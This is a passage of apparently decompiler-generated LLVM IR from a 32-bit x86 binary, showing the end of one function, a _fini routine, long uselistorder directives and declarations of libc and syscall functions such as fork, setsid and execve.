dec_label_pc_805492c:                             ; preds = %dec_label_pc_805492c.loopexit, %entry
  %v2_805492c = phi i32 [ %v2_805492c.pre, %dec_label_pc_805492c.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_805492c

; uselistorder directives
  uselistorder i32 %v0_805490c, { 1, 0 }
  uselistorder i1 false, {}
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 45, 22, 36, 37, 38, 39, 51, 52, 53, 54, 5, 55, 1, 50, 23, 40, 3, 41, 42, 43, 6, 56, 57, 58, 59, 60, 61, 7, 48, 46, 47, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 8, 2, 44, 9, 0, 49 }
  uselistorder i32 ptrtoint (i32* @global_var_8058000.211 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, {}
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_8054920, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8054937 = load i32, i32* @ebx, align 4
  %v1_8054938 = call i32 @__get_pc_thunk_bx(i32 %v0_8054937)
  store i32 %v1_8054938, i32* @eax, align 4
  %v0_8054943 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8054943

; uselistorder directives
  uselistorder i32* @eax, { 13, 29, 103, 2, 104, 105, 1, 106, 0, 28, 102, 107, 30, 108, 53, 54, 56, 14, 55, 109, 114, 110, 111, 112, 113, 4, 5, 90, 91, 201, 115, 46, 34, 122, 35, 123, 124, 125, 126, 36, 37, 142, 143, 38, 144, 39, 145, 40, 41, 42, 146, 147, 148, 149, 43, 150, 151, 152, 153, 44, 135, 189, 203, 204, 49, 205, 206, 208, 50, 209, 6, 207, 10, 12, 202, 100, 15, 57, 58, 155, 59, 190, 192, 193, 191, 60, 61, 194, 195, 197, 198, 196, 154, 45, 7, 8, 131, 132, 133, 48, 134, 127, 128, 129, 130, 62, 63, 136, 137, 64, 65, 92, 94, 93, 95, 96, 98, 52, 97, 138, 139, 47, 140, 141, 116, 31, 32, 117, 118, 119, 120, 33, 121, 16, 66, 67, 68, 17, 18, 20, 19, 69, 71, 72, 70, 73, 74, 75, 76, 77, 21, 78, 22, 79, 23, 80, 24, 81, 82, 83, 84, 85, 86, 87, 88, 25, 89, 99, 26, 3, 27, 51, 101, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 184, 181, 182, 183, 185, 186, 187, 188, 210, 199, 200, 9, 11 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1170, 19, 20, 21, 117, 76, 688, 1171, 1174, 1172, 1173, 689, 951, 952, 292, 1185, 1177, 1179, 1180, 24, 66, 1181, 1182, 1183, 690, 1184, 131, 132, 133, 1175, 1176, 140, 1186, 1187, 1189, 1190, 1188, 1191, 255, 1192, 1193, 1194, 1195, 1196, 1197, 142, 143, 691, 327, 328, 809, 692, 810, 141, 811, 812, 813, 814, 815, 816, 79, 80, 817, 818, 819, 663, 820, 78, 693, 77, 694, 144, 145, 695, 22, 696, 821, 23, 697, 146, 329, 698, 699, 147, 700, 1200, 701, 1198, 234, 1199, 330, 331, 148, 149, 67, 702, 1201, 1202, 1203, 1204, 1205, 332, 703, 704, 150, 1206, 25, 81, 924, 113, 114, 705, 1207, 82, 706, 26, 707, 953, 333, 1208, 1209, 1210, 954, 955, 16, 256, 152, 151, 956, 957, 257, 958, 708, 1211, 1212, 709, 959, 710, 960, 961, 962, 963, 1213, 153, 711, 154, 334, 1220, 1216, 1217, 1218, 1219, 120, 27, 1233, 1234, 1247, 1248, 1249, 1250, 1256, 1257, 1258, 1259, 1251, 1252, 1253, 1254, 1255, 83, 84, 712, 1260, 1261, 155, 713, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 156, 1337, 1338, 157, 1339, 1340, 1341, 85, 121, 258, 134, 714, 122, 964, 158, 965, 28, 123, 115, 966, 216, 159, 967, 0, 968, 1221, 1222, 1229, 335, 1230, 715, 969, 336, 970, 971, 972, 973, 974, 975, 976, 160, 716, 977, 978, 979, 980, 161, 981, 717, 211, 337, 162, 718, 719, 720, 163, 982, 259, 983, 1323, 1324, 1325, 260, 315, 316, 1326, 1327, 1328, 1329, 1330, 1331, 721, 261, 984, 116, 722, 985, 164, 262, 263, 986, 987, 723, 988, 989, 990, 991, 109, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1, 217, 992, 124, 993, 218, 724, 725, 994, 165, 995, 1349, 1364, 1365, 1366, 338, 1367, 937, 1368, 830, 1421, 1422, 1423, 1424, 1425, 822, 1426, 1369, 1370, 1427, 166, 1428, 1439, 1440, 29, 726, 2, 139, 727, 728, 1452, 1456, 219, 1457, 167, 635, 339, 340, 3, 1429, 1430, 1431, 168, 169, 777, 662, 170, 729, 831, 264, 265, 171, 832, 833, 172, 173, 835, 834, 836, 837, 341, 636, 838, 840, 839, 841, 1432, 1433, 174, 730, 1438, 886, 887, 888, 889, 731, 732, 890, 891, 892, 266, 175, 176, 733, 823, 734, 824, 177, 735, 178, 736, 1159, 86, 1160, 1161, 1162, 1163, 1164, 4, 737, 1302, 738, 825, 826, 827, 828, 739, 179, 1441, 637, 180, 267, 1445, 1448, 1447, 1373, 268, 1374, 1375, 1376, 1377, 269, 1378, 1379, 1380, 342, 1371, 343, 1372, 344, 740, 842, 135, 843, 270, 741, 844, 742, 743, 345, 638, 744, 346, 639, 181, 745, 1381, 1382, 182, 183, 347, 640, 137, 69, 70, 1383, 1384, 1385, 1386, 1387, 1388, 184, 185, 348, 641, 136, 1389, 220, 1390, 118, 1391, 1392, 1394, 746, 1393, 5, 829, 6, 1446, 845, 846, 847, 848, 850, 849, 7, 271, 1350, 1351, 1352, 1280, 747, 272, 1281, 748, 1282, 1283, 1284, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1342, 1332, 186, 187, 749, 750, 273, 1453, 1455, 30, 1178, 8, 188, 996, 997, 349, 998, 189, 751, 999, 221, 125, 1303, 1304, 1000, 87, 1285, 274, 275, 190, 1001, 1002, 1003, 191, 1231, 88, 752, 1223, 753, 1228, 1227, 222, 754, 755, 1224, 1226, 1225, 223, 756, 851, 1232, 852, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 192, 757, 1016, 276, 1017, 1018, 1019, 1020, 1021, 31, 32, 758, 242, 243, 1022, 1023, 1024, 1025, 193, 1026, 1027, 1028, 759, 1029, 33, 34, 194, 760, 1030, 1031, 1032, 1035, 1033, 1034, 35, 71, 89, 1036, 1037, 1038, 1039, 317, 1040, 1041, 195, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 197, 1050, 1051, 1052, 761, 1053, 1054, 224, 225, 1055, 1056, 1057, 198, 196, 1058, 199, 1059, 1060, 762, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 200, 763, 764, 201, 1080, 1081, 1082, 765, 766, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 767, 768, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 769, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 277, 770, 278, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 279, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 36, 90, 91, 92, 93, 1139, 1140, 1141, 1142, 1143, 1144, 202, 1145, 771, 1146, 1147, 1148, 1149, 642, 1150, 1151, 1152, 1153, 1154, 1155, 203, 772, 119, 68, 110, 1068, 226, 1434, 1435, 227, 1437, 1436, 94, 350, 773, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 280, 1245, 204, 774, 775, 1246, 1156, 205, 1214, 776, 1215, 1420, 206, 1165, 1442, 1443, 1444, 853, 1333, 1348, 854, 1355, 1449, 138, 281, 1410, 1454, 1356, 1411, 855, 1357, 207, 856, 857, 858, 859, 860, 861, 863, 864, 862, 865, 1311, 1358, 1359, 866, 1450, 1451, 665, 212, 354, 643, 213, 355, 644, 867, 353, 95, 17, 18, 356, 868, 666, 363, 364, 285, 286, 284, 357, 645, 365, 366, 37, 208, 282, 351, 667, 869, 209, 283, 352, 664, 870, 228, 126, 359, 647, 293, 358, 646, 871, 872, 873, 874, 876, 235, 875, 668, 877, 367, 368, 369, 370, 878, 648, 649, 360, 361, 362, 244, 245, 246, 97, 880, 371, 879, 374, 375, 96, 372, 376, 377, 373, 881, 378, 882, 318, 883, 884, 885, 379, 127, 287, 38, 39, 893, 669, 670, 391, 392, 383, 894, 896, 384, 385, 895, 231, 897, 671, 393, 394, 380, 898, 900, 381, 382, 899, 230, 901, 319, 902, 903, 904, 905, 672, 395, 396, 386, 906, 908, 387, 388, 907, 229, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 673, 397, 398, 389, 919, 674, 399, 400, 390, 920, 921, 675, 401, 402, 922, 923, 676, 403, 404, 677, 405, 406, 678, 407, 408, 925, 294, 926, 40, 295, 927, 214, 928, 679, 410, 411, 680, 412, 413, 681, 414, 415, 682, 416, 417, 683, 418, 419, 215, 684, 420, 421, 929, 320, 930, 931, 932, 933, 409, 934, 650, 935, 936, 128, 129, 938, 939, 241, 41, 239, 240, 940, 321, 941, 942, 943, 944, 651, 945, 423, 946, 652, 422, 238, 236, 42, 237, 653, 947, 948, 949, 950, 43, 424, 1157, 1158, 44, 72, 98, 247, 427, 425, 426, 654, 655, 428, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 656, 802, 803, 657, 299, 804, 296, 297, 298, 805, 806, 658, 430, 807, 1166, 1167, 45, 101, 1168, 46, 47, 429, 1169, 99, 73, 100, 431, 659, 15, 248, 249, 250, 1294, 432, 1295, 1296, 1297, 288, 1298, 106, 1299, 1300, 1301, 48, 102, 103, 104, 105, 660, 49, 50, 51, 52, 53, 9, 10, 11, 12, 1305, 1307, 1308, 1309, 435, 1310, 433, 300, 434, 301, 1306, 322, 436, 437, 289, 302, 290, 13, 291, 685, 438, 1312, 251, 252, 253, 254, 440, 1313, 439, 441, 303, 1314, 1315, 442, 54, 55, 1320, 56, 74, 1321, 304, 1316, 1317, 443, 444, 1318, 1319, 323, 445, 446, 447, 305, 661, 1322, 1334, 1335, 1336, 686, 306, 448, 450, 308, 449, 307, 107, 57, 75, 1343, 1344, 324, 1345, 1346, 130, 1347, 58, 325, 108, 687, 1353, 451, 452, 453, 1354, 455, 454, 1360, 1361, 1362, 1363, 456, 59, 457, 458, 459, 460, 461, 1404, 112, 111, 60, 311, 312, 1395, 1396, 1397, 1398, 232, 309, 310, 313, 1399, 1400, 1401, 1402, 61, 62, 63, 1403, 326, 64, 65, 1405, 1406, 314, 14, 1407, 1408, 1409, 210, 808, 233, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465 }
  uselistorder i32* @ebx, {}
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
